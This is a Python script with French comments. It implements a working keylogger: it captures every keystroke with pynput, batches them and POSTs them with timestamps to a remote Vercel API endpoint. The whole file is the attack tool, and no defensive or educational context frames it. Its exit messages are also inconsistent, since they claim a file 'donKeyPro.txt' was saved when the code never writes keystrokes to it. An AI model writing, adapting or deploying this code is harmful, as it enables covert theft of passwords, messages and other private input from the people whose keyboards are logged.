# -*- coding: utf-8 -*-
from pynput.keyboard import Listener
from datetime import datetime
import re
import requests  # Ajoutez cette importation en haut du fichier

# Dictionnaire pour mapper les touches spéciales
SPECIAL_KEYS = {
    'Key.space': ' ',
    'Key.shift': '',  # Ignore les touches shift
    'Key.shift_r': '',
    'Key.shift_l': '',
    'Key.ctrl_l': '',
    'Key.ctrl_r': '',
    'Key.alt_l': '',
    'Key.alt_r': '',
    'Key.alt_gr': '',  # Ignorer Alt Gr
    'Key.enter': '\n',
    'Key.backspace': '[BACKSPACE]',
    'Key.tab': '[TAB]',
    'Key.esc': '[ESC]',
    'Key.caps_lock': '',  # Ignorer Caps Lock
    'Key.delete': '[DELETE]',
    'Key.up': '[UP]',
    'Key.down': '[DOWN]',
    'Key.left': '[LEFT]',
    'Key.right': '[RIGHT]',
}

# Buffer pour accumuler les frappes
buffer = []

# Configurez l'URL de votre API Vercel
API_URL = "https://votre-app.vercel.app/api/keystrokes"

def send_to_server(data):
    """
    Envoie les données au serveur Vercel.
    """
    try:
        payload = {
            'timestamp': datetime.now().isoformat(),
            'keystrokes': data
        }
        response = requests.post(API_URL, json=payload)
        if response.status_code != 200:
            print(f"Erreur lors de l'envoi au serveur: {response.status_code}")
    except Exception as e:
        print(f"Erreur de connexion au serveur: {e}")

def write_to_file(key):
    """
    Traite la touche pressée et l'envoie au serveur.
    """
    try:
        letter = str(key).replace("'", "")
        letter = SPECIAL_KEYS.get(letter, letter)

        if letter == '[BACKSPACE]':
            if buffer:
                buffer.pop()
        else:
            buffer.append(letter)

        # Envoie au serveur au lieu d'écrire dans un fichier
        if len(buffer) >= 10:  # Envoie par lots de 10 caractères
            flush_buffer()

    except Exception as e:
        print(f"Erreur lors du traitement : {e}")

def flush_buffer():
    """
    Envoie le contenu du buffer au serveur et vide le buffer.
    """
    try:
        if buffer:
            data = ''.join(buffer)
            cleaned_data = clean_text(data)
            send_to_server(cleaned_data)
            buffer.clear()
    except Exception as e:
        print(f"Erreur lors de l'envoi au serveur : {e}")

def clean_text(text):
    """
    Nettoie le texte en corrigeant les guillemets, les apostrophes et les erreurs d'encodage.
    """
    # Remplacer les doubles guillemets par des apostrophes simples
    text = re.sub(r'""', "'", text)
    # Remplacer les triples guillemets par des apostrophes simples
    text = re.sub(r'"""', "'", text)
    # Remplacer les caractères mal encodés
    text = text.encode('utf-8', errors='ignore').decode('utf-8')
    return text

# Démarre l'écoute du clavier
with Listener(on_press=write_to_file) as listener:
    try:
        print("Enregistrement des frappes... Appuyez sur Ctrl+C pour arrêter.")
        listener.join()
    except KeyboardInterrupt:
        # Écrit les frappes restantes dans le fichier avant de quitter
        flush_buffer()
        print("\nEnregistrement terminé. Les données ont été sauvegardées dans 'donKeyPro.txt'.")

        # Nettoyer le fichier après l'enregistrement
        try:
            with open("donKeyPro.txt", 'r', encoding='utf-8') as f:
                content = f.read()
            cleaned_content = clean_text(content)
            with open("donKeyPro.txt", 'w', encoding='utf-8') as f:
                f.write(cleaned_content)
            print("Le fichier a été nettoyé et les erreurs corrigées.")
        except Exception as e:
            print(f"Erreur lors du nettoyage du fichier : {e}")